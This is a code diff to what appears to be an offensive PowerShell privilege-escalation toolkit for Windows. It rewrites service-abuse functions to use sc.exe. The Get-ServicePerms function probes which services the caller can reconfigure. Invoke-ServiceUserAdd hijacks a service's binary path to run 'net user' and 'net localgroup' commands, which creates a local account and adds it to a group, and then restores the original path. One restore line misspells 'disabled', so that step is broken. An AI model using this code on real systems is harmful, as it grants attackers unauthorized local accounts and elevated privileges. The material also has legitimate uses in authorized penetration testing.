@@ -124,16 +124,16 @@ function Get-ServicePerms {
         
     foreach ($service in $services){
 
-        $returnValue = ($service | Invoke-WmiMethod -Name Change -ArgumentList @($null)).ReturnValue
+        # try to change the path of the service to its existing path name
+        $result = sc.exe config $($service.Name) binPath= $($service.PathName)
 
-        # if we get a 0, that means we can modify the service
-        if ($returnValue -eq 0){
+        # means the change was successful        
+        if ($result -notcontains "Access is denied."){
             $out = New-Object System.Collections.Specialized.OrderedDictionary
             $out.add('ServiceName', $service.name)
             $out.add('Path', $service.pathname)
             $out
         }
-
     }
 
 }
@@ -195,7 +195,12 @@ function Invoke-ServiceUserAdd {
             $RestoreDisabled = $false
             if ($TargetService.StartMode -eq "Disabled"){
                 Write-Verbose "Service '$ServiceName' disabled, enabling..."
-                $TargetService | Invoke-WmiMethod -Name ChangeStartMode -ArgumentList @("Manual") | Out-Null
+
+                $result = sc.exe config $($TargetService.Name) start= demand
+                if ($result -contains "Access is denied."){
+                    Write-Warning "[!] Access to service $($TargetService.Name) denied"
+                    return $false
+                }
                 $RestoreDisabled = $true
             }
 
@@ -207,48 +212,64 @@ function Invoke-ServiceUserAdd {
 
             Write-Verbose "Adding user '$UserName'"
             # stop the service
-            $TargetService | Invoke-WmiMethod -Name StopService | Out-Null
+            $result = sc.exe stop $($TargetService.Name)
+            if ($result -contains "Access is denied."){
+                Write-Warning "[!] Access to service $($TargetService.Name) denied"
+                return $false
+            }
+
             # modify the service path to add a user
             $UserAddCommand = "net user $UserName $Password /add"
-            # change the path name to the user add command
-            $TargetService | Invoke-WmiMethod -Name Change -ArgumentList @($null, $null, $null, $null, $null, $UserAddCommand) | Out-Null
+            # change the path name to the user add command- if sc config doesn't error out here,
+            # it shouldn't later on
+            $result = sc.exe config $($TargetService.Name) binPath= $UserAddCommand
+            if ($result -contains "Access is denied."){
+                Write-Warning "[!] Access to service $($TargetService.Name) denied"
+                return $false
+            }
+
             # start the service and breath
-            $TargetService | Invoke-WmiMethod -Name StartService | Out-Null
+            $result = sc.exe start $($TargetService.Name)
             Start-Sleep -s 1
 
             Write-Verbose "Adding user '$UserName' to group '$GroupName'"
             # stop the service
-            $TargetService | Invoke-WmiMethod -Name StopService | Out-Null
+            $result = sc.exe stop $($TargetService.Name)
+            Start-Sleep -s 1
+
             # modify the service path to add the user to the specified local group
             $GroupAddCommand = "net localgroup $GroupName $UserName /add"
             # change the path name to the group add command
-            $TargetService | Invoke-WmiMethod -Name Change -ArgumentList @($null, $null, $null, $null, $null, $GroupAddCommand) | Out-Null
+            $result = sc.exe config $($TargetService.Name) binPath= $GroupAddCommand
+
             # start the service and breath
-            $TargetService | Invoke-WmiMethod -Name StartService | Out-Null
+            $result = sc.exe start $($TargetService.Name)
             Start-Sleep -s 1
 
             Write-Verbose "Restoring original path to service '$ServiceName'"
             # stop the service
-            $TargetService | Invoke-WmiMethod -Name StopService | Out-Null
+            $result = sc.exe stop $($TargetService.Name)
+            Start-Sleep -s 1
             # restore the original binary path
-            $TargetService | Invoke-WmiMethod -Name Change -ArgumentList @($null, $null, $null, $null, $null, $OriginalPath) | Out-Null
-            
+            $result = sc.exe config $($TargetService.Name) binPath= $OriginalPath
+
             # try to restore the service to whatever state it was
             if ($RestoreDisabled){
                 Write-Verbose "Re-disabling service '$ServiceName'"
-                $TargetService | Invoke-WmiMethod -Name ChangeStartMode -ArgumentList @("Disabled") | Out-Null
+                $result = sc.exe config $($TargetService.Name) start= disbaled
             }
             elseif ($OriginalState -eq "Paused"){
                 Write-Verbose "Starting and then pausing service '$ServiceName'"
-                $TargetService | Invoke-WmiMethod -Name StartService | Out-Null
-                $TargetService | Invoke-WmiMethod -Name PauseService | Out-Null
+                $result = sc.exe start $($TargetService.Name)
+                Start-Sleep -s .5
+                $result = sc.exe pause $($TargetService.Name)
             }
             elseif ($OriginalState -eq "Stopped"){
                 Write-Verbose "Leaving service '$ServiceName' in stopped state"
             }
             else{
                 Write-Verbose "Starting service '$ServiceName'"
-                $TargetService | Invoke-WmiMethod -Name StartService | Out-Null
+                $result = sc.exe start $($TargetService.Name)
             }
 
             $true
@@ -558,15 +579,23 @@ function Invoke-ServiceStart {
 
             # enable the service if it was marked as disabled
             if ($TargetService.StartMode -eq "Disabled"){
-                Write-Verbose "Service '$ServiceName' disabled, enabling..."
-                $TargetService | Invoke-WmiMethod -Name ChangeStartMode -ArgumentList @("Manual") | Out-Null
+
+                $r = Invoke-ServiceEnable -ServiceName $ServiceName
+                if (-not $r){ return $false }
             }
 
             # start the service up
             Write-Verbose "Starting service '$ServiceName'"
-            $TargetService | Invoke-WmiMethod -Name StartService | Out-Null
+            $result = sc.exe start $($TargetService.Name)
 
-            $true
+            if ($result -contains "Access is denied."){
+                Write-Warning "[!] Access to service $($TargetService.Name) denied"
+                $false
+            }
+            else{
+                $true
+            }
+
         }
         catch{
             Write-Warning "Error: $_"
@@ -614,9 +643,17 @@ function Invoke-ServiceStop {
 
             # stop the service
             Write-Verbose "Stopping service '$ServiceName'"
-            $TargetService | Invoke-WmiMethod -Name StopService | Out-Null
 
-            $true
+            $result = sc.exe stop $($TargetService.Name)
+
+            if ($result -contains "Access is denied."){
+                Write-Warning "[!] Access to service $($TargetService.Name) denied"
+                $false
+            }
+            else{
+                $true
+            }
+
         }
         catch{
             Write-Warning "Error: $_"
@@ -663,9 +700,16 @@ function Invoke-ServiceEnable {
 
             # enable the service
             Write-Verbose "Enabling service '$ServiceName'"
-            $TargetService | Invoke-WmiMethod -Name ChangeStartMode -ArgumentList @("Manual") | Out-Null
 
-            $true
+            $result = sc.exe config $($TargetService.Name) start= demand
+            if ($result -contains "Access is denied."){
+                Write-Warning "[!] Access to service $($TargetService.Name) denied"
+                $false
+            }
+            else{
+                $true
+            }
+
         }
         catch{
             Write-Warning "Error: $_"
@@ -712,9 +756,16 @@ function Invoke-ServiceDisable {
 
             # disable the service
             Write-Verbose "Disabling service '$ServiceName'"
-            $TargetService | Invoke-WmiMethod -Name ChangeStartMode -ArgumentList @("Disabled") | Out-Null
 
-            $true
+            $result = sc.exe config $($TargetService.Name) start= disabled
+            if ($result -contains "Access is denied."){
+                Write-Warning "[!] Access to service $($TargetService.Name) denied"
+                $false
+            }
+            else{
+                $true
+            }
+
         }
         catch{
             Write-Warning "Error: $_"
